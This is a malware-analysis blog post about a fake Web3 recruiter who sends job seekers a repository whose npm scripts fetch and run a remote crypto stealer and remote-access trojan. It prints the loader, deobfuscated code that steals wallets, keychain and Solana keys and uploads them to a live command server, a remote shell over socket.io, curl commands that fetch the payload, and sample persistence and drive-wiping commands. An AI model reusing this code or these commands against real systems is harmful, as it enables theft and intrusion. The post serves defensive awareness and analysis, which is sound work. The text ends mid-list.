---
title: "Reverse Engineering of Evil:\nThe case of the generous\n(and fake) recruiter" 
date: "2025-07-05"
author: "Leo Sagan"
excerpt: "You were looking for a job in the Web3 industry, and ended up losing everything:\n
- Complete savings\n
- Accounts on all social networks
- Access to payment platforms\n
- Critical personal data
This is not a real story, but a potentially real one."
description: "Scam, deception, social engineering, and other techniques used to deceive people into giving up their personal information and money."
image: "https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/0.png"
tags: ["linkedin", "scams", "jobs", "web3 development"]
language: "🇬🇧"
---

<!--
# Reverse Engineering of Evil:<br/>The Case of the Generous<br/>(and Fake) Recruiter

<div style="text-align:center">
  <img
 width="66%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/0.png" alt="cover" />
<br/>
By LeoSagan (x.com/ethsagan)
<br/>
</div>

-->

<div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">

[![Threat Level](https://img.shields.io/badge/Threat%20Level-CRITICAL-red)](https://github.com) [![Malware Type](https://img.shields.io/badge/Type-Stealer%20%2B%20RAT-lightgray)](https://github.com) [![Platforms](https://img.shields.io/badge/Platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgray)](https://github.com)

</div>

<br/>

```
 ⚠️ The sum of all online fears:

You were looking for a job in the Web3 industry, and ended up losing everything:

- Complete savings
- Accounts on all social networks
- Access to payment platforms
- Critical personal data

This is not a real story, but a **potentially real** one.
```

<br/>

## INTRODUCTION

Whenever we see alerts like "malicious code detected" or "malware detected", we stop there, delete the file and that's it. We don't know what it was, or what it intended to do, but it was surely something malicious. See you in the future.

### But now, we're going to have certainty about how malicious it really was.

<br/>

### TL;DR

| Phase           | Description                                                                  | Risk            |
| --------------- | ---------------------------------------------------------------------------- | --------------- |
| Initial Contact | Recruiter/CTO/COO contacts you offering position with strikingly high salary | 💤 Low          |
| Job Description | Sends description that seems perfect for your profile                        | 💤 Low          |
| Quick Interview | Brief chat, confirms you're "perfect" for the position                       | 👀 Medium       |
| Skill Test      | Requests you clone their repository to make modifications as technical test  | 🔴 High         |
| Execution       | Their apparently harmless code is **a direct ticket to ruin**                | 💀 **CRITICAL** |

### This analysis will show you:

- What the malware does exactly
- How to identify these threats
- How to defend yourself effectively

<br/>

---

## 📑 TABLE OF CONTENTS

- [🔍 BACKGROUND](#-background)
- [🎯 THREAT SUMMARY](#-threat-summary)
- [🔍 CONTEXT AND DISCOVERY](#-context-and-discovery)
- [🕷️ THE MALICIOUS REPOSITORY](#️-the-malicious-repository)
- [🔬 COMPLETE MALWARE ANALYSIS](#-complete-malware-analysis)
- [🎭 VICTIM PROFILING](#-victim-profiling)
- [🌐 ATTACKER INFRASTRUCTURE](#-attacker-infrastructure)
- [🛡️ DETECTION AND COUNTERMEASURES](#️-detection-and-countermeasures)
- [⚡ URGENT RECOMMENDATIONS](#-urgent-recommendations)
- [📝 CONCLUSIONS](#-conclusions)

<br/>

## 🔍 BACKGROUND

> ### 💭 _"Just as you spend 24 hours a day thinking about how to improve, progress, and do good, there are others who spend 24 hours a day thinking about how to do evil."_

### The evolution of cybercrime

After almost a decade working in the blockchain industry, I have observed an **infinitude of scams, deceptions, and social engineering attempts**. The worrying thing is that recently they have been perfected exponentially:

- **Before:** Boring, rough and easily detectable scams
- **Now:** Social engineering attacks, specifically targeted to vulnerable people/systems with powerful AI technologies
- **Main vector:** Tempting job offers, although sometimes exaggerated, ready to capture unwary users.

### The case study

Last week, I was contacted by a supposed **founder & CEO** with an apparently legitimate profile:

- ✅ **500+ connections** on LinkedIn
- ✅ **Endorsements** from other users
- ✅ **Common contacts** verifiable, some IRL known
- ✅ had worked at some reputable institutions/universities, but as we know, in LinkedIn one can put that he was president of the Earth and no one will say otherwise.

Although he also had some red flags:

- ❌ **Few** interactions with other users, and very dubious
- ❌ **No** participation in events, nor publications
- ❌ It was not possible to verify his real existence by other means

Nevertheless, I took the task of **completely dissecting** his strategy to determine the real scope of the threat.

### Dissection of the modus operandi

What I found was a true **malicious engineering**:

> 🚨 **The supposed job offer was a sophisticated and perverse systemic control mechanism**

**It was not just about stealing crypto wallets and credentials.** That was only the entry point. Things were going to get **exponentially worse**.

<br/>

---

## 🎯 THREAT SUMMARY

### Basic Information

| Attribute            | Detail                                                                             |
| -------------------- | ---------------------------------------------------------------------------------- |
| **Original Vector**  | Fake job offers on LinkedIn (they contact first)                                   |
| **Objectives**       | 22+ crypto wallets + browser credentials + total remote control                    |
| **Affected Systems** | Windows, macOS, Linux                                                              |
| **Severity**         | ![Critical](https://img.shields.io/badge/CRITICAL-red) Total loss + persistent RAT |
| **C&C Server**       | `144.172.105.189` (multiple ports)                                                 |

### Primary Capabilities

| Capability              | Description                                      | Impact      |
| ----------------------- | ------------------------------------------------ | ----------- |
| Mass Wallet Robbery     | 22+ browser extensions as target                 | 💀 Critical |
| Credential Extraction   | Passwords saved in browsers                      | 🔴 High     |
| Complete Remote Control | RAT via Socket.IO                                | 💀 Critical |
| Persistence             | Download and installation of additional payload  | 🔴 High     |
| Clipboard Monitoring    | Captures wallet addresses in real-time           | 🔴 High     |
| Evasion                 | Multiple anti-analysis/obfuscation techniques    | 🔶 Medium   |
| Comprehensive Profiling | Virtualization, schedules, geolocation, patterns | 🔶 Medium   |

### Impact Distribution

- Financial Losses: 40%
- System Control: 30%
- Credential Robbery: 20%
- Persistence: 10%

### Targeted Wallets and Platforms

| Type                 | Examples                         | Risk            |
| -------------------- | -------------------------------- | --------------- |
| **Hot Wallets**      | MetaMask, Phantom, Trust Wallet  | 💀 **Critical** |
| **Exchange Wallets** | Coinbase, Binance extensions     | 💀 **Critical** |
| **Desktop Wallets**  | Exodus, Solana CLI               | 🔴 **High**     |
| **Browsers**         | Chrome, Brave, Opera credentials | 🔴 **High**     |

<br/>

---

## 🔍 CONTEXT AND DISCOVERY

### The Modus Operandi

The **supposed recruiter** (sometimes self-designated tech lead or C-level) initiates contact following this pattern:

- LinkedIn contact
- Attractive job offer
- Personalized job description
- Short call without camera
- Technical challenge
- Repository cloning/download
- Malware execution

Everything begins with something like:

<div style="text-align:center">
  <img 
 width="66%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/33.png" alt="invite" />
</div>

<br/>
    
---

### Preparation for Analysis

> ⚠️ **DISCLAIMER:** This procedure must be performed with **extreme caution** in a completely isolated environment.

#### Security Requirements

| Component      | Requirement                    |                                          |
| -------------- | ------------------------------ | ---------------------------------------- |
| Hardware       | Dedicated/isolated equipment   | No personal, valuable, or sensitive data |
| Virtualization | ⚠️ May be counterproductive    | **Spoiler:** They will profile you       |
| Connection     | Multiple layers VPN + Firewall | Maximum anonymity and protection         |
| OS             | Exotic Linux/BSD               | **⚠️ NEVER** Windows or MacOS            |

🎯 **The more exotic the operating system, the lower the risk**. Could this potentially increase your scoring in profiling? Maybe, but we can still modify the "user agent" to avoid suspicion.

Examples of recommended distributions for study:

```bash
- Qubes OS (maximum isolation)
- Tails (maximum anonymity)
- OpenBSD (maximum security)
- Alpine Linux (minimum attack surface)
```

#### Critical Reminder

⚠️ We are facing an unknown threat
❓ We do not know its full methods
❓ We do not know its actual capabilities
❓ We do not understand its full strength

Stay alert and do not underestimate the risk is CRITICAL

<br/>

---

## 🕷️ THE MALICIOUS REPOSITORY

🚨 DISCLAIMER: Do not clone or download, published only for illustrative purposes 🚨

🕷️ https://gitlab.com/technical-assessment4/Rental-Platform 🕷️

- By the time you read this, it might have been deleted, but there are hundreds of forks and clones circulating
- It is usually private, for which they ask for your Github/Gitlab/Bitbucket username so they can send you the invite. In passing, they will know your GitHub activity and refine your profiling (🚩)
- It is quite extensive, with many files, dependencies, scripts, and even `.env` files already populated (I will delve into this later). It usually contains complex frontend, backend, contract, etc. structures. The idea is to give the appearance of an important development and "scare" you in the complex architecture and a myriad of folders.

<div style="text-align:center">
  <img   src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/4.png" alt="folder structure" />
</div>

<br/>

And this is the subject in question 👇

<div style="text-align:center">
  <img 
 width="50%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/1.png" alt="culprit" />
</div>

<br/>

- A quick look at the `package.json` reveals nothing suspicious, except for this:

```json
"scripts": {
    "predeploy": "concurrently \"node server/server.js\" \"npm run build\"",
    "deploy": "concurrently \"node server/server.js\" \"gh-pages -d build\"",
    "start": "concurrently \"node server/server.js\" \"react-scripts start\"",
    "build": "concurrently \"node server/server.js\" \"react-scripts build\"",
    "test": "concurrently \"node server/server.js\" \"react-scripts test\"",
    "eject": "concurrently \"node server/server.js\" \"react-scripts eject\""
  },
```

Which indicates that `server/server.js` is executed regardless of the command used. We will see why (🚩).

All scripts in package.json use `concurrently` which calls `node server/server.js`, and which in turn imports `app.js`:

```javascript
"start": "concurrently \"node server/server.js\" \"react-scripts start\""
```

So if `npm start` or `npm run start` is used, it executes:

- `node server/server.js` >
- `react-scripts start` >
- `app.js` >
- `initAppBootstrap(); // 🏴‍☠️ 🚩 It executes without conditions`

🚨 **This seemingly innocent function is the entry point to a sophisticated remote control system.
From here, we begin the detailed analysis of what the malware actually does.**

<br/>

---

## 🔬 COMPLETE MALWARE ANALYSIS

In this section, we will analyze step by step how this sophisticated stealer works, from its entry point to its most advanced capabilities.

### Malicious Entry Point

Once any `npm` script is executed, `initAppBootstrap()` is automatically launched. Let's see what it does:

```javascript
const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);
    const k = atob(process.env.DEV_SECRET_KEY);
    const v = atob(process.env.DEV_SECRET_VALUE);
    const s = (await axios.get(src, { headers: { [k]: v } })).data;
    const handler = new Function.constructor("require", s);
    handler(require);
  } catch (error) {
    console.log(error);
  }
};
```

At first glance, it doesn't seem very malicious, they are just environment variables containing the API keys to be used later, but if we look at the `.env` file, we will see that it is **_extremely complete_**:

```bash
DEV_APP_URL = "http://localhost:4000"
SPARKPOST_API_KEY = "ca184ac5f2e659ee65272911f6b0795586e15b20"
DEV_SERVER_PORT = 4000
DEV_DB_HOST = "localhost"
DEV_DB_USER = "root"
DEV_API_KEY="aHR0cHM6Ly9icy1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL29u"
DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
DEV_SECRET_VALUE="Xw=="
```

Nothing unusual, right?
Why would someone be so kind as to give you the API keys already loaded?
Well, if we use the magic of `base64` decoding, we will see how the crime is revealed:

```bash
DEV_API_KEY="aHR0cHM6Ly9icy1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL29u"
# Decodes to: https://bs-production.up.railway.app/on 🚩🚩🚩

DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
# Decodes to: x-secret-key

DEV_SECRET_VALUE="Xw=="
# Decodes to: _
```

There you go 🚩🚩🚩:
https://bs-production.up.railway.app/on
Why does it was encoded this URL on an environment variable?

- This is the Command and Control server URL. To hack you.

Cleaned up, the code looks something like this:

```javascript
const initAppBootstrap = async () => {
  try {
    // 🚩 STEP 1: Decode environment variables from base64
    const src = atob(process.env.DEV_API_KEY); // C&C server URL
    const k = atob(process.env.DEV_SECRET_KEY); // Authentication header name
    const v = atob(process.env.DEV_SECRET_VALUE); // Authentication header value

    // 🚩🚩 STEP 2: Download payload from remote server
    const s = (await axios.get(src, { headers: { [k]: v } })).data;

    // 🚩🚩🚩 STEP 3: Execute the downloaded code with full system access
    const handler = new Function.constructor("require", s);
    handler(require);
  } catch (error) {
    console.log(error); // Silence errors to avoid alerting the victim
  }
};
```

And there they are, the decoded environment variables.
**_The bastard saved the URL and authentication keys in environment variables._**

Meanwhile, we notice that:

- Using `atob` we decoded the environment variable `DEV_API_KEY` to a hidden URL
- `Function.constructor` is equivalent to `eval()` but less noticeable to the untrained eye
- Uses custom HTTP headers for authentication
- Allows the attacker to change the payload without modifying the local code
- The downloaded code has full access to the `require` object of Node.js. It allows arbitrary JS execution from a remote server

We will see why (🚩).

### Other potentially suspicious files aka `extreme obfuscation`

After verifying _all_ files (!), I noticed another interesting pattern in `imageCompressor.js`: _suspicious minified code_

```javascript
// Deobfuscated version would be:
const Jimp = require("jimp");
const path = require("path");

module.exports = async (filename, width, inputPath, outputDir, subfolder) => {
  try {
    const image = await Jimp.read(inputPath);
    await image
      .resize(width, Jimp.AUTO)
      .write(path.resolve(outputDir, subfolder, filename));
    return `${subfolder}/${filename}`;
  } catch (error) {
    console.log("Error at reducing size / converting picture: ", error);
  }
};
```

Although this file seems legitimate, extreme obfuscation is a red flag. What should we pay attention to in this regard?

- Unnecessarily minified/obfuscated files (since they wouldn't pass a linter)
- Files with a code structure very different from others
- Multiple levels of folders, unnecessary, but hiding the malicious code in some branch
- Files with hundreds of blank spaces, ending with a malicious `require()`

Additionally, this malware used evasion strategies:

- Legitimate names: `bootstrap.js` seems like a normal file
- Silent try-catch: Errors are not shown to the victim
- Conditional execution: Only executed if variables are defined
- Mixed with real code: The project has real functionality to appear legitimate

### Evaluating the victim

At this point, the criminal's URL has been reported appropriately.

Up to this point, we have seen that the malware is sophisticated and capable of passing unnoticed. But we only saw half of it, the truly malicious part is the one that is downloaded and executed.

> ### 🚩🚩🚩 Kids, don't try this at home. Don't do it!

Only for educational purposes, I will show you exactly what it would do once downloaded, there will be variations in the modus operandi and code. If one wanted to dissect it again, I recommend doing it in an isolated environment, some quick alternatives are:

1. CodeSandbox
   URL: https://codesandbox.io/
   Creates a "Node.js" sandbox
   Integrated terminal available
2. Glitch
   URL: https://glitch.com/
   Terminal in browser
   Servers in the cloud
3. GitHub Codespaces
   URL: https://github.com/codespaces
   Full terminal in browser
   GitHub IP, not yours
4. Google Colab (with shell commands)
   URL: https://colab.research.google.com/
   Uses !curl in cells
   Google Cloud IP

### Steps for CodeSandbox (quickest option)

- Create a temporary email account (e.g., 10minutemail.com)
- When the Editor appears, open its terminal and execute:

```bash
# Run analysis
curl -s -v -H "x-secret-key: _" "https://bs-production.up.railway.app/on" 2>&1 | tee malware_analysis.txt

# View content
cat malware_analysis.txt
```

Alternative with maximum anonymity: proxy chains

```bash
curl -s --proxy $(curl -s "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" | head -1) -H "x-secret-key: _" "https://bs-production.up.railway.app/on"
```

Produces an unreadable output:

![Image](https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/5.png)

In this way, you will have downloaded the malware and then, we will begin with the dissection.

### Some techniques employed:

It's a JS file of almost 2kb, highly obfuscated, initially I used `deobfuscate.io` but surprisingly received a message like this:

```
Notification
Your code looks like it has been obfuscated using Obfuscator.io, would you like to go to the deobfuscator specific for that?
```

So the tool redirected me to `https://obf-io.deobfuscate.io/` which worked and returned a more human-readable code.

What did I find?

```javascript
 const homeDir = os.homedir();
  const tmpDir = os.tmpdir();
  const fs_promises = require("fs/promises");
  const getAbsolutePath = (_0x416b16) =>
    _0x416b16.replace(/^~([a-z]+|\/)/, (_0x227b5c, _0x47f187) =>
      "/" === _0x47f187 ? homeDir : path.dirname(homeDir) + "/" + _0x47f187
    );
  function testPath(_0x3e6c41) {
    try {
      fs.accessSync(_0x3e6c41);
      return true;
    } catch (_0x1caf4f) {
      return false;
    }
  }
  const R = [
    "Local/BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
  ];
  const Q = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"];
  const X = [
    "Roaming/Opera Software/Opera Stable",
    "com.operasoftware.Opera",
    "opera",
  ];
  const Bt = [
    "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "ejbalbakoplchlghecdalmeeeajnimhm",
    "fhbohimaelbohpjbbldcngcnapndodjp",
    "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "aeachknmefphepccionboohckonoeemg",
    "hifafgmccdpekplomjjkcfgodnhcellj", ...
```

- Hexadecimal variable names (`_0x8d2ecb`, `_0x1d2535`)
- Nested self-executing functions
- Fragmented strings
- Integrated anti-debugging

---

### Malware Architecture

It has a sophisticated modular architecture with three main components that work together.

#### 🔧 Main Module (Lines 1-600)

Already, seeing that it uses `child_process` gives us the certainty that something really bad is going to happen.

```javascript
const fs = require("fs");
const os = require("os");
const path = require("path");
const request = require("request");
const ex = require("child_process").exec;
const hostname = os.hostname();
const platform = os.platform();
const homeDir = os.homedir();
```

#### 🎮 Remote Control Module (Lines 1000-1171)

The sum of all fears: The remote control code is really malicious, and that's exactly what's going to happen to us.

```javascript
makeLog("Installing socket.io-client");
execSync(
  "npm install socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent",
  { windowsHide: true }
);
let io = require("socket.io-client");
```

Here, `socket.io-client` is installed, which is a Node.js package that allows communication between nodes, and which is used for communication between the malware and the remote server.

#### 🦊 Wallet Search Module (Lines 95-400)

The constant `Bt` is revealing:

```javascript
const Bt = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
  "ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask Legacy
  "fhbohimaelbohpjbbldcngcnapndodjp", // Trust Wallet
  // ... and 19 more wallets!!
];
```

Contains a list of IDs of browser extensions from the most popular wallets. Every time you install one or when you open it in full screen, you will notice that the URL says something like chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html (for MetaMask case).
That `nkbihfbeogaeaoehlefnkodbefgpgknn` is precisely the MetaMask ID, which is hardcoded, along with 21 other wallets.

### Complete List of Targeted Wallets

| Extension ID                       | Wallet          | Platform          | Risk     |
| ---------------------------------- | --------------- | ----------------- | -------- |
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask        | Chrome/Brave/Edge | CRITICAL |
| `ejbalbakoplchlghecdalmeeeajnimhm` | MetaMask Legacy | Chrome/Brave      | CRITICAL |
| `fhbohimaelbohpjbbldcngcnapndodjp` | Trust Wallet    | Chrome/Brave      | CRITICAL |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | TronLink        | Chrome/Brave      | CRITICAL |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Phantom         | Chrome/Brave      | CRITICAL |
| `aeachknmefphepccionboohckonoeemg` | Coin98 Wallet   | Chrome/Brave      | HIGH     |
| `hifafgmccdpekplomjjkcfgodnhcellj` | Crypto com      | Chrome/Brave      | HIGH     |
| `jblndlipeogpafnldhgmapagcccfchpi` | Keplr           | Chrome/Brave      | HIGH     |
| `acmacodkjbdgmoleebolmdjonilkdbch` | Guarda          | Chrome/Brave      | HIGH     |
| `dlcobpjiigpikoobohmabehhmhfoodbb` | Argent X        | Chrome/Brave      | HIGH     |
| `mcohilncbfahbmgdjkbpemcciiolgcge` | OKX Wallet      | Chrome/Brave      | CRITICAL |
| `agoakfejjabomempkjlepdflaleeobhb` | Sui Wallet      | Chrome/Brave      | HIGH     |
| `omaabbefbmiijedngplfjmnooppbclkk` | CloverWallet    | Chrome/Brave      | MEDIUM   |
| `aholpfdialjgjfhomihkjbmgjidlcdno` | Wombat          | Chrome/Brave      | MEDIUM   |
| `nphplpgoakhhjchkkhmiggakijnkhfnd` | Ton Wallet      | Chrome/Brave      | HIGH     |
| `penjlddjkjgpnkllboccdgccekpkcbin` | Nami            | Chrome/Brave      | HIGH     |
| `lgmpcpglpngdoalbgeoldeajfclnhafa` | Eternl          | Chrome/Brave      | HIGH     |
| `fldfpgipfncgndfolcbkdeeknbbbnhcc` | XDEFI Wallet    | Chrome/Brave      | HIGH     |
| `bhhhlbepdkbapadjdnnojkbgioiodbic` | Solflare        | Chrome/Brave      | HIGH     |
| `gjnckgkfmgmibbkoficdidcljeaaaheg` | Slope Wallet    | Chrome/Brave      | HIGH     |
| `afbcbjpbpfadlkmhmclhkeeodmamcflc` | Math Wallet     | Chrome/Brave      | MEDIUM   |

> 💡 **Total: 22+ wallets** identified as primary targets

### Remote Control System via Socket.io

#### Automatic Installation:

```javascript
makeLog("Installing socket.io-client");
execSync(
  "npm install socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent",
  { windowsHide: true }
);
let io = require("socket.io-client");
```

#### Connection:

```javascript
const socket = io("http://144.172.105.189:4661", {
  reconnectionAttempts: 15,
  reconnectionDelay: 2000,
  timeout: 2000,
});
```

#### Remote Command Execution:

```javascript
socket.on("command", (msg) => {
  exec(
    msg.message,
    { windowsHide: true, maxBuffer: 1024 * 1024 * 300 },
    (error, stdout, stderr) => {
      if (error) {
        socket.emit("message", {
          result: error.message,
          ...msg,
          uid: uid,
          type: "error",
        });
        return;
      }
      socket.emit("message", {
        ...msg,
        result: stdout,
        uid: uid,
      });
    }
  );
});
```

#### This will result in the remote attacker being able to execute any command they want, as if they were sitting in front of your computer, without opening a window (thanks to `windowHide:true`) and they will be able to obtain the result on their machine.

<br/>

---

### Wallet Data Robbery

#### Extraction:

```javascript
const uploadFiles = async (_0x87ab6a, _0x53011f, _0x3a0da2, _0x4b5d3b) => {
  for (let _0x391096 = 0; _0x391096 < 200; _0x391096++) {
    const _0x248003 =
      _0x87ab6a +
      "/" +
      (0 === _0x391096 ? "Default" : "Profile " + _0x391096) +
      "/Local Extension Settings";

    for (let _0x59bf21 = 0; _0x59bf21 < Bt.length; _0x59bf21++) {
      let _0x2d650a = _0x248003 + "/" + Bt[_0x59bf21];
      if (testPath(_0x2d650a)) {
        // Extraction of .log and .ldb files
        if (_0x1011c7.includes(".log") || _0x1011c7.includes(".ldb")) {
          _0x21aea7.push({
            value: fs.createReadStream(_0x1011c7),
            options: _0x141f82,
          });
        }
      }
    }
  }
};
```

This function will search for all `.log` and `.ldb` files, and upload them to the remote server.

#### Robbing Exodus:

```javascript
const uploadEs = (_0x5d45cf) => {
  let _0x1fabf7 = "";
  if ("w" == platform[0]) {
    _0x1fabf7 = getAbsolutePath("~/") + "/AppData/Roaming/Exodus/exodus.wallet";
  } else if ("d" == platform[0]) {
    _0x1fabf7 =
      getAbsolutePath("~/") + "/Library/Application Support/exodus.wallet";
  } else {
    _0x1fabf7 = getAbsolutePath("~/") + "/.config/Exodus/exodus.wallet";
  }
};
```

#### Robbing Solana Files:

```javascript
if (
  _0x3a0da2 &&
  ((_0x23268a = homeDir + "/.config/solana/id.json"), fs.existsSync(_0x23268a))
) {
  try {
    const _0x26a148 = {
      filename: "solana_id.txt",
    };
    _0x21aea7.push({
      value: fs.createReadStream(_0x23268a),
      options: _0x26a148,
    });
  } catch (_0x24237b) {}
}
```

#### Upload Server

```javascript

const Upload = (_0x5f0e9c, _0x769ab6) => {
  const _0x2303f0 = {
    type: "106",
    hid: "212_" + hostname,
    uts: _0x769ab6,
    multi_file: _0x5f0e9c,
  };
  try {
    if (_0x5f0e9c.length > 0) {
      const _0x2d5a53 = {
        url: "http://144.172.105.189:1224/uploads",
        formData: _0x2303f0,
      };
      request.post(_0x2d5a53, (_0x414814, _0x46a43c, _0x54fe86) => {});
    }
  }
}
```

### Clipboard Monitoring

Clipboard capture:

- macOS: Uses command pbpaste
- Windows: Uses powershell Get-Clipboard
- Monitored every 500ms
- Automatically sends all copied content to the server
- Detection of copied crypto addresses

#### MacOS Capture

```javascript
if (os.platform() == "darwin") {
  exec(
    "pbpaste",
    { windowsHide: true, stdio: "ignore" },
    (error, stdout, stderr) => {
      currentClipboardContent = stdout.trim();
      if (currentClipboardContent !== lastClipboardContent) {
        handleClipboardChange(currentClipboardContent);
        lastClipboardContent = currentClipboardContent;
      }
    }
  );
}
```

#### Windows Capture

```javascript
else if(os.platform() == "win32"){
  exec("powershell Get-Clipboard", {windowsHide: true, stdio: "ignore"},
    (error, stdout, stderr) => {
      currentClipboardContent = stdout.trim();
      if (currentClipboardContent !== lastClipboardContent) {
        handleClipboardChange(currentClipboardContent);
      }
    })
}
```

#### Robbing Keychain (MacOS)

Not satisfied with everything above, something really critical is the theft of MacOS credentials:

```javascript
const UpKeychain = async (_0x332023) => {
  let _0xcd51e3 = [];
  let _0x50fa57 = homeDir + "/Library/Keychains/login.keychain";
  if (fs.existsSync(_0x50fa57)) {
    try {
      const _0x459b00 = {
        filename: "logkc-db",
      };
      _0xcd51e3.push({
        value: fs.createReadStream(_0x50fa57),
        options: _0x459b00,
      });
    } catch (_0xf6507f) {}
  }

```

#### **Once the connection with the C&C server is established, the malware begins an exhaustive collection of information about the victim to maximize the value of the attack.**

<br/>

---

## 🎭 VICTIM PROFILING

The malware performs an exhaustive analysis of each victim to determine their value as a target and personalize the attack asynchronously. I do not rule out that this information is saved in some database of the attacker, leaving the ground prepared for the perfection of his tools. The malware can remain silent, without activity for an indefinite period, waiting for the remote activation order.

The attacker can extract this information from the victim:

- Complete operating system
- Platform (Windows/Mac/Linux)
- OS version
- Hostname
- User information (name, home directory, etc.)
- Unique UID to identify the victim

```javascript
socket.on("whour", (msg) => {
  socket.emit("whoIm", {
    OS: os.type(),
    platform: os.platform(),
    release: os.release(),
    host: os.hostname(),
    userInfo: os.userInfo(),
    uid: uid,
    t: "6",
  });
});
```

On virtualization:

```javascript
else if (os.platform() == "linux") {
  let output = fs.readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
  if (/hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs/.test(output)) {
    isVM = true;
  }
}
```

Why is this important?

> Being on a VM might indicate to the attacker that you are a high-value target, or an opSec specialist... or another hacker 😅

### TO KEEP IN MIND:

This is a non-exhaustive list of things that could be detected:

1. System Profile

```javascript
uid: "5d41402abc4b2a76b9719d911017c592"; // Unique malware ID, attacker knows which instance
hostname: os.hostname(); // Machine name
```

- Hardware/Software characteristics:
  ```javascript
  OS: os.type(); // Windows/Linux/Darwin
  platform: os.platform(); // win32/linux/darwin
  release: os.release(); // OS version
  userInfo: os.userInfo(); // Username, uid, gid, shell, homedir
  ```
- Environment detection:
  - Physical vs Virtual: " (VM)" vs "(Local)"
  - Virtualization type: VMware, VirtualBox, QEMU, KVM, Xen, Parallels, Bochs

2. User/Behavior Profile

- Installed and used browsers:
  - Chrome (profiles 0-199)
  - Brave Browser
  - Opera
  - Firefox
  - Microsoft Edge
- Financial/Crypto activity:
  - 22 different wallets detected by extensions
  - Desktop wallets: Exodus, Solana
  - Transaction history in wallets

3. Financial Profile, Indicators of "wealth" crypto:

- Number of installed wallets
- Types of wallets (DeFi, NFT, exchanges)
- Backup/recovery files
- Financial documents:

```javascript
searchKey = [
  "*credential*",
  "*account*",
  "*profile*",
  "*.pdf",
  "*.doc",
  "*.docx", // May contain banking info
];
```

4. Security Profile, security measures implemented

- VM usage (indicates technical/cautious user)
- Types of wallets (hardware vs software)
- Organized backup files
- Work patterns:
  - Clipboard monitoring every 500ms
  - Detects if it copies addresses, seeds, passwords

5. Geographical/Temporal Profile

- Time zone and activity
- Infection timestamp
- Clipboard usage patterns
- Activity hours

6. Value as Victim Profile

- Automatic classification:
- High value: Physical hardware + multiple wallets + financial documents
- Medium value: VM with some wallets
- Low value: VM without detected wallets
- Targeting specific, the server can decide which payloads to send based on:
  - Environment type (VM vs physical)
  - Detected wallets
  - Apparent technical level

7. Operational Intelligence, for the attacker, this profiling allows:

- Prioritize victims (physical > VM)
- Personalize attacks (developer vs casual user)
- Assess risk (technical environment vs domestic)
- Optimize payloads (what to steal first)
- Avoid detection (behaving differently in VMs)

8. Red/Infrastructure Profile

- Connectivity information
- Ability to receive remote commands
- Connection stability (15 retries, 2s delay)

---

## 🌐 ATTACKER INFRASTRUCTURE

With all the information collected from the victim, the malware communicates constantly with a well-organized criminal infrastructure. Let's analyze this network in detail.

### Command and Control System

The attacker has complete bidirectional communication via socket.io:

```javascript
// THE ATTACKER CAN SEND:
socket.on("command", ...)     // System commands
socket.on("whour", ...)       // Information request

// THE VICTIM SENDS AUTOMATICALLY:
socket.emit("message", ...)   // Command results
socket.emit("whoIm", ...)     // System information
makeLog(content)              // Clipboard content
```

What could the attacker do?

```javascript
# List processes
tasklist                    # Windows
ps aux                      # Linux/Mac

# View files
dir C:\Users\%USERNAME%     # Windows
ls -la ~/                   # Linux/Mac

# Network information
ipconfig /all               # Windows
ifconfig                    # Linux/Mac

```

Some examples?

Robbing commands:

```javascript
# Copy wallets
copy "C:\Users\%USERNAME%\AppData\Roaming\Exodus\*" D:\temp\
cp -r ~/.config/Exodus/ /tmp/

# Compress data
tar -czf stolen.tar.gz ~/.config/
```

Persistence commands:

```javascript
# Create scheduled tasks
schtasks /create /tn "Update" /tr "node malware.js" /sc minute
crontab -e  # Add cron job

# Modify registry (Windows)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

Mass destruction commands:

```javascript
# Delete evidence
del /f /s /q C:\temp\stolen\*
rm -rf /tmp/stolen/

# Format drives (extreme) 🥴
format C: /q

```

---

### Collected and Exfiltrated Data

Complete inventory of all information the malware can steal from the victim.

#### 🌐 Browser Credentials:

- `Login Data` (saved passwords)
- `Local State` (configurations and tokens)
- Chrome, Brave, Opera, Firefox, Edge user profiles

#### 🦊 Wallet Data:

- `.log` and `.ldb` files from extensions
- Seeds and recovery phrases
- Exodus wallet configurations
- MacOS Keychain (`login.keychain`)
- Solana files (`~/.config/solana/id.json`)

#### 🔍 Specific Files Searched:

```javascript
const searchKey = [
  "*.env*",
  "*metamask*",
  "*phantom*",
  "*bitcoin*",
  "*phrase*",
  "*secret*",
  "*mnemonic*",
  "*seed*",
  "*recovery*",
  "*backup*",
  "*wallet*",
